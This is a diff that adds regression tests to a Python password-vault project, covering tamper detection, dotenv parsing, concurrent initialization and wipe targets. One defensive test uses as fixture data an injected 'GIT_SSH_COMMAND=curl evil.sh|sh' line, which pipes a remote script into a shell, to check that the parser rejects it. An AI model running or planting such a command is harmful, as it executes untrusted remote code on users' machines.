@@ -1,7 +1,8 @@
 """Regression tests for the pre-push review of the 0.3.0 release branch.
 
 Each test reproduces one reported defect and asserts the fix holds. Numbering
-(r1..r10) follows the review report order.
+(r1..r10) follows the first review report; the s1..s8 block covers the second
+pass over those fixes.
 """
 
 import secrets
@@ -20,14 +21,17 @@ from sofiavault.cli import (
     VaultSession,
     _refuse_if_tampered,
     _repo_dir,
+    _verify_before_write,
     _wipe_targets,
     cmd_add,
+    cmd_delete,
 )
 from sofiavault.core import create_master_record
 from sofiavault.storage import (
     get_password,
     get_schema_version,
     init_db,
+    refresh_entries_mac,
     save_entry,
     verify_entries_mac,
 )
@@ -378,3 +382,251 @@ def test_r10_docstring_and_changelog_declare_the_break():
     changelog = (REPO_ROOT / "CHANGELOG.md").read_text(encoding="utf-8")
     assert "Breaking" in changelog
     assert "delete_entry(conn, entry_id, key)" in changelog
+
+
+# ═════════════════════════════════════════════════════════════════════════════
+# Second review pass: defects found in the fixes above.
+# ═════════════════════════════════════════════════════════════════════════════
+
+
+def _tamper_rows_behind(conn: sqlite3.Connection):
+    """Rewrite the row set out from under a live session/vault."""
+    raw = sqlite3.connect(conn.execute("PRAGMA database_list").fetchone()[2])
+    raw.execute("DELETE FROM entries_v2 WHERE id = (SELECT MIN(id) FROM entries_v2)")
+    raw.commit()
+    raw.close()
+
+
+# ── s1: the compat shim must not restore a stale import-time path ────────────
+
+def test_s1_nested_patch_restores_the_sandbox_not_the_real_vault():
+    real = paths.DB_PATH
+    sandbox = Path(tempfile.mkdtemp()) / "outer.db"
+    inner = Path(tempfile.mkdtemp()) / "inner.db"
+    try:
+        sofiavault.DB_PATH = sandbox
+        with patch("sofiavault.DB_PATH", inner):
+            assert inner == paths.DB_PATH
+        # must fall back to the sandbox, never to the real ~/.sofiavault
+        assert sandbox == paths.DB_PATH
+        assert sandbox == sofiavault.DB_PATH
+        assert real != paths.DB_PATH
+    finally:
+        sofiavault.DB_PATH = real
+
+
+def test_s1_dict_seed_tracks_current_value():
+    real = paths.DB_PATH
+    sandbox = Path(tempfile.mkdtemp()) / "vault.db"
+    try:
+        sofiavault.DB_PATH = sandbox
+        assert sys.modules["sofiavault"].__dict__["DB_PATH"] == sandbox
+    finally:
+        sofiavault.DB_PATH = real
+
+
+# ── s2: writes re-verify the MAC against the file, not a cached flag ─────────
+
+def test_s2_library_set_detects_tampering_after_unlock():
+    path = Path(tempfile.mkdtemp()) / "secrets.db"
+    v = Vault.create(path, PW)
+    v.set("github", "tok")
+    v.set("stripe", "sk")
+    assert v.tampered is False  # clean at unlock
+
+    _tamper_rows_behind(v._conn)
+
+    with pytest.raises(VaultCorrupted):
+        v.set("unrelated", "value")
+    assert verify_entries_mac(v._conn, v._key) is False
+    v.close()
+
+
+def test_s2_library_delete_detects_tampering_after_unlock():
+    path = Path(tempfile.mkdtemp()) / "secrets.db"
+    v = Vault.create(path, PW)
+    v.set("github", "tok")
+    v.set("stripe", "sk")
+    _tamper_rows_behind(v._conn)
+
+    with pytest.raises(VaultCorrupted):
+        v.delete("stripe")
+    v.close()
+
+
+def test_s2_cli_add_detects_tampering_after_unlock():
+    session = _session_with_entry()
+    save_entry(session.conn, session.key, "github", "u", "p")
+    session.reload()
+    assert session.tampered is False
+
+    _tamper_rows_behind(session.conn)
+
+    with patch("builtins.input", side_effect=["newsite", "user@x.com"]), \
+            patch("sofiavault.cli.getpass") as gp:
+        gp.getpass.return_value = "secret"
+        with pytest.raises(SystemExit):
+            cmd_add(session)
+    # nothing re-signed: the evidence survives
+    conn = sqlite3.connect(session.conn.execute(
+        "PRAGMA database_list").fetchone()[2])
+    assert conn.execute(
+        "SELECT COUNT(*) FROM entries_v2").fetchone()[0] == 1
+    conn.close()
+
+
+def test_s2_cli_delete_detects_tampering_after_unlock():
+    session = _session_with_entry()
+    save_entry(session.conn, session.key, "github", "u", "p")
+    session.reload()
+    _tamper_rows_behind(session.conn)
+
+    with patch("builtins.input", side_effect=["y"]), pytest.raises(SystemExit):
+        cmd_delete(session, "github")
+
+
+def test_s2_verify_before_write_passes_on_clean_vault():
+    session = _session_with_entry()
+    _verify_before_write(session)  # must not raise or exit
+    assert session.tampered is False
+
+
+# ── s3: wipe stays reachable on a tampered vault ─────────────────────────────
+
+def test_s3_wipe_is_exempt_from_the_tamper_gate():
+    src = (REPO_ROOT / "sofiavault" / "cli.py").read_text(encoding="utf-8")
+    assert "if command != 'wipe':" in src
+    # and the guidance points at wipe rather than manual deletion
+    assert "sofiavault wipe" in src
+
+
+def test_s3_tamper_message_offers_wipe():
+    session = _session_with_entry()
+    session.tampered = True
+    with pytest.raises(SystemExit):
+        _refuse_if_tampered(session)
+
+
+# ── s4: concurrent first-time init_db must not crash ─────────────────────────
+
+def test_s4_concurrent_brand_new_init_does_not_raise():
+    path = Path(tempfile.mkdtemp()) / "vault.db"
+    a = init_db(path)
+    b = init_db(path)  # second process racing on the same fresh file
+    assert get_schema_version(a) >= 3
+    assert get_schema_version(b) >= 3
+    a.close()
+    b.close()
+
+
+def test_s4_second_open_never_downgrades_recorded_version():
+    path = Path(tempfile.mkdtemp()) / "vault.db"
+    v = Vault.create(path, PW)
+    v.set("a", "b")
+    v.close()
+    conn = init_db(path)
+    assert get_schema_version(conn) >= 3
+    conn.close()
+
+
+# ── s5/s7: dotenv quoting — comments, escapes, and multi-line closes ─────────
+
+def _import_pairs(text: str) -> dict:
+    return dict(envload._iter_env_pairs(text))
+
+
+def test_s5_multiline_close_with_inline_comment_does_not_swallow():
+    pairs = _import_pairs(
+        'PEM="first\n'
+        'second"  # note\n'
+        "DB_PASSWORD=hunter2\n"
+        'C="x"\n'
+    )
+    assert pairs["PEM"] == "first\nsecond"
+    assert pairs["DB_PASSWORD"] == "hunter2"
+    assert pairs["C"] == "x"
+
+
+def test_s5_multiline_close_with_junk_is_malformed_not_swallowed():
+    pairs = _import_pairs('PEM="first\nsecond" junk\nDB_PASSWORD=hunter2\n')
+    assert pairs["PEM"] is None          # hard error, not silent absorption
+    assert pairs["DB_PASSWORD"] == "hunter2"
+
+
+def test_s7_escaped_quotes_inside_a_value_still_import():
+    pairs = _import_pairs('KEY="say \\"hi\\""\nNEXT=plain\n')
+    assert pairs["KEY"] == 'say \\"hi\\"'
+    assert pairs["NEXT"] == "plain"
+
+
+def test_s7_apostrophe_inside_single_quoted_value_still_imports():
+    pairs = _import_pairs("PASS='it's-secret'\nNEXT=plain\n")
+    assert pairs["PASS"] == "it's-secret"
+    assert pairs["NEXT"] == "plain"
+
+
+def test_s7_escaped_quote_file_imports_end_to_end():
+    v = Vault.create(Path(tempfile.mkdtemp()) / "secrets.db", PW)
+    env_file = v.path.with_name("app.env")
+    env_file.write_text('KEY="say \\"hi\\""\nDB_PASSWORD=hunter2\n')
+    imported, _skipped, _rejected = envload.import_env_file(v, env_file)
+    assert sorted(imported) == ["DB_PASSWORD", "KEY"]
+    v.close()
+
+
+def test_s5_name_smuggling_still_rejected_in_multiline_values():
+    # The original attack the multi-line branch exists to stop.
+    pairs = _import_pairs(
+        'JWT_PRIVATE_KEY="-----BEGIN PRIVATE KEY-----\n'
+        "GIT_SSH_COMMAND=curl evil.sh|sh\n"
+        '-----END PRIVATE KEY-----"\n'
+    )
+    assert list(pairs) == ["JWT_PRIVATE_KEY"]
+    assert "GIT_SSH_COMMAND" in pairs["JWT_PRIVATE_KEY"]
+
+
+# ── s6: a non-UTF-8 pyproject.toml must not crash the unlock ─────────────────
+
+def test_s6_non_utf8_pyproject_disables_update_check_quietly():
+    tmp = Path(tempfile.mkdtemp())
+    pkg = tmp / "app" / "sofiavault"
+    pkg.mkdir(parents=True)
+    cli = pkg / "cli.py"
+    cli.write_text("")
+    (tmp / "app" / ".git").mkdir()
+    (tmp / "app" / "pyproject.toml").write_bytes(b'# caf\xe9\nname = "sofiavault"\n')
+
+    with patch("sofiavault.cli.__file__", str(cli)):
+        assert _repo_dir() is None  # quietly declines, does not raise
+
+
+# ── s9: cmd_add must not report success for a row that vanished ──────────────
+
+def test_s9_overwrite_of_vanished_row_still_stores_the_password():
+    session = _session_with_entry()
+    entry_id = session.entries[0].id
+    # Row disappears after the index was built (another process deleted it).
+    session.conn.execute("DELETE FROM entries_v2 WHERE id = ?", (entry_id,))
+    refresh_entries_mac(session.conn, session.key)
+
+    with patch("builtins.input", side_effect=["amazon", "y", "user@x.com"]), \
+            patch("sofiavault.cli.getpass") as gp:
+        gp.getpass.return_value = "stored-anyway"
+        cmd_add(session)
+
+    session.reload()
+    entry = [e for e in session.entries if e.service == "amazon"]
+    assert entry, "reported Saved but stored nothing"
+    assert get_password(session.conn, session.key, entry[0].id) == "stored-anyway"
+
+
+# ── s10: wipe covers every SQLite sidecar it claims to ───────────────────────
+
+def test_s10_wipe_targets_include_shm_sidecars():
+    tmp = Path(tempfile.mkdtemp())
+    with patch("sofiavault.paths.DB_PATH", tmp / "vault.db"), \
+            patch("sofiavault.paths.HISTORY_PATH", tmp / ".history"):
+        targets = _wipe_targets()
+    for db in ("vault.db", "users.db"):
+        for suffix in ("-wal", "-shm", "-journal"):
+            assert tmp / f"{db}{suffix}" in targets
